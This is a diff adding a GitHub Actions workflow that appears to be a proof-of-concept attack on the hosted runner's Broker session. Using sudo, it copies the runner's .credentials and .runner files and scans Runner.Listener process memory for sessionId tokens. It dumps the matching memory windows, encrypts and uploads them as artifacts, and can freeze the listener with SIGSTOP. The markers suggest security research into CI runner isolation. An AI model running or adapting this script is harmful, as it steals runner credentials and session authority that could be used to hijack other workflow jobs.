@@ -1,0 +1,216 @@
+name: f004-broker-pending-message
+
+on:
+  workflow_dispatch:
+    inputs:
+      actor:
+        description: Controlled actor label
+        required: true
+        type: choice
+        options:
+          - A
+          - B
+      pause_listener:
+        description: Pause Runner.Listener after authority capture
+        required: true
+        default: false
+        type: boolean
+
+permissions:
+  contents: read
+
+jobs:
+  capture-and-hold:
+    runs-on: ubuntu-latest
+    timeout-minutes: 15
+    env:
+      F004_ACTOR: ${{ inputs.actor }}
+      F004_CAPTURE_CERT: ${{ secrets.F004_CAPTURE_CERT }}
+    steps:
+      - name: Capture encrypted Broker authority
+        shell: bash
+        run: |
+          set -euo pipefail
+          umask 077
+          test -n "$F004_CAPTURE_CERT"
+          raw="$RUNNER_TEMP/f004-broker-raw"
+          sealed="$RUNNER_TEMP/f004-broker-sealed"
+          mkdir -p "$raw/memory" "$raw/runner-diag" "$sealed"
+          sleep 8
+
+          runner_root="/home/runner/actions-runner/cached/2.337.0"
+          sudo cp "$runner_root/.credentials" "$raw/.credentials"
+          sudo cp "$runner_root/.runner" "$raw/.runner"
+          sudo cp -a "$runner_root/_diag/." "$raw/runner-diag/" 2>/dev/null || true
+          ps -eo user,pid,ppid,stat,lstart,args ww > "$raw/processes.txt"
+          printf '%s\n' "$GITHUB_RUN_ID:$F004_ACTOR:broker-pending" > "$raw/actor-canary.txt"
+
+          sudo python3 - "$raw/memory" <<'PY'
+          import os
+          import pathlib
+          import re
+          import subprocess
+          import sys
+
+          output = pathlib.Path(sys.argv[1])
+          output.mkdir(parents=True, exist_ok=True)
+          needle = b'GET /message?sessionId='
+          pids = subprocess.run(
+              ['pgrep', '-f', 'Runner.Listener'],
+              capture_output=True,
+              text=True,
+              check=False,
+          ).stdout.split()
+          manifest = []
+          seen = set()
+          for pid_text in pids:
+              pid = int(pid_text)
+              try:
+                  comm = pathlib.Path(f'/proc/{pid}/comm').read_text().strip()
+                  maps_text = pathlib.Path(f'/proc/{pid}/maps').read_text()
+                  mem = open(f'/proc/{pid}/mem', 'rb', buffering=0)
+              except OSError as exc:
+                  manifest.append(f'{pid} open-error {exc}')
+                  continue
+              pathlib.Path(output, f'{pid}-{comm}.maps').write_text(maps_text)
+              with mem:
+                  for line in maps_text.splitlines():
+                      fields = line.split()
+                      if len(fields) < 2 or 'r' not in fields[1]:
+                          continue
+                      start_text, end_text = fields[0].split('-')
+                      start = int(start_text, 16)
+                      end = int(end_text, 16)
+                      if end <= start or end - start > 1024 * 1024 * 1024:
+                          continue
+                      position = start
+                      overlap = b''
+                      while position < end:
+                          size = min(1024 * 1024, end - position)
+                          try:
+                              chunk = os.pread(mem.fileno(), size, position)
+                          except OSError:
+                              break
+                          data = overlap + chunk
+                          base = position - len(overlap)
+                          cursor = 0
+                          while True:
+                              index = data.find(needle, cursor)
+                              if index < 0:
+                                  break
+                              absolute = base + index
+                              page = absolute // 4096
+                              if page not in seen:
+                                  seen.add(page)
+                                  window_start = max(start, absolute - 131072)
+                                  window_end = min(end, absolute + 131072)
+                                  try:
+                                      window = os.pread(mem.fileno(), window_end - window_start, window_start)
+                                  except OSError:
+                                      window = b''
+                                  if window:
+                                      name = f'{pid}-{comm}-{len(seen):02d}-{absolute:x}.bin'
+                                      pathlib.Path(output, name).write_bytes(window)
+                                      manifest.append(f'{pid} {comm} 0x{absolute:x} {len(window)}')
+                              cursor = index + len(needle)
+                          overlap = data[-262144:]
+                          position += size
+          pathlib.Path(output, 'manifest.txt').write_text('\n'.join(manifest) + '\n')
+          if not seen:
+              raise SystemExit('Broker session marker not found in Runner.Listener memory')
+          PY
+
+          sudo chown -R "$USER:$USER" "$raw"
+          python3 - "$raw" "$sealed/metadata.json" <<'PY'
+          import hashlib
+          import json
+          import os
+          import pathlib
+          import re
+          import sys
+
+          raw = pathlib.Path(sys.argv[1])
+          output = pathlib.Path(sys.argv[2])
+          sessions = set()
+          pattern = re.compile(rb'GET /message\?sessionId=([0-9a-fA-F-]{36})')
+          for path in (raw / 'memory').glob('*.bin'):
+              sessions.update(value.decode().lower() for value in pattern.findall(path.read_bytes()))
+          if len(sessions) != 1:
+              raise SystemExit(f'expected one Broker session, found {len(sessions)}')
+          session = next(iter(sessions))
+          canary = (raw / 'actor-canary.txt').read_bytes()
+          report = {
+              'repository': os.environ['GITHUB_REPOSITORY'],
+              'run_id': os.environ['GITHUB_RUN_ID'],
+              'actor': os.environ['F004_ACTOR'],
+              'runner_name': os.environ['RUNNER_NAME'],
+              'session_sha256': hashlib.sha256(session.encode()).hexdigest(),
+              'canary_sha256': hashlib.sha256(canary).hexdigest(),
+              'memory_capture_count': len(list((raw / 'memory').glob('*.bin'))),
+          }
+          output.write_text(json.dumps(report, indent=2) + '\n')
+          print(json.dumps(report, indent=2))
+          PY
+
+          printf '%s\n' "$F004_CAPTURE_CERT" > "$RUNNER_TEMP/f004-certificate.pem"
+          tar -C "$raw" -cf "$RUNNER_TEMP/f004-broker.tar" .
+          openssl cms -encrypt -binary -aes-256-cbc \
+            -in "$RUNNER_TEMP/f004-broker.tar" \
+            -outform DER \
+            -out "$sealed/payload.cms" \
+            "$RUNNER_TEMP/f004-certificate.pem"
+          shasum -a 256 "$sealed/payload.cms" | awk '{print $1}' > "$sealed/payload.cms.sha256"
+          shred -u "$RUNNER_TEMP/f004-broker.tar" "$RUNNER_TEMP/f004-certificate.pem"
+          sudo rm -rf "$raw"
+
+      - name: Upload encrypted authority
+        uses: actions/upload-artifact@v4
+        with:
+          name: f004-broker-${{ inputs.actor }}-${{ github.run_id }}
+          path: ${{ runner.temp }}/f004-broker-sealed
+          retention-days: 1
+          compression-level: 0
+
+      - name: Pause B listener with automatic resume
+        if: ${{ inputs.pause_listener }}
+        shell: bash
+        run: |
+          set -euo pipefail
+          state="$RUNNER_TEMP/f004-pause-state"
+          mkdir -p "$state"
+          listener_pid=$(pgrep -o -f 'Runner.Listener')
+          test -n "$listener_pid"
+          sudo systemd-run \
+            --unit="f004-resume-${GITHUB_RUN_ID}" \
+            --on-active=300s \
+            /bin/kill -CONT "$listener_pid"
+          sudo kill -STOP "$listener_pid"
+          sleep 2
+          listener_stat=$(ps -o stat= -p "$listener_pid" | tr -d ' ')
+          printf 'actor=%s\nlistener_pid=%s\nlistener_stat=%s\nresume_after_seconds=300\n' \
+            "$F004_ACTOR" "$listener_pid" "$listener_stat" > "$state/state.txt"
+          [[ "$listener_stat" == *T* ]]
+
+      - name: Record unpaused A listener
+        if: ${{ !inputs.pause_listener }}
+        shell: bash
+        run: |
+          set -euo pipefail
+          state="$RUNNER_TEMP/f004-pause-state"
+          mkdir -p "$state"
+          listener_pid=$(pgrep -o -f 'Runner.Listener')
+          listener_stat=$(ps -o stat= -p "$listener_pid" | tr -d ' ')
+          printf 'actor=%s\nlistener_pid=%s\nlistener_stat=%s\nresume_after_seconds=0\n' \
+            "$F004_ACTOR" "$listener_pid" "$listener_stat" > "$state/state.txt"
+
+      - name: Upload listener state
+        uses: actions/upload-artifact@v4
+        with:
+          name: f004-broker-state-${{ inputs.actor }}-${{ github.run_id }}
+          path: ${{ runner.temp }}/f004-pause-state
+          retention-days: 1
+          compression-level: 0
+
+      - name: Hold controlled worker live
+        shell: bash
+        run: sleep 480
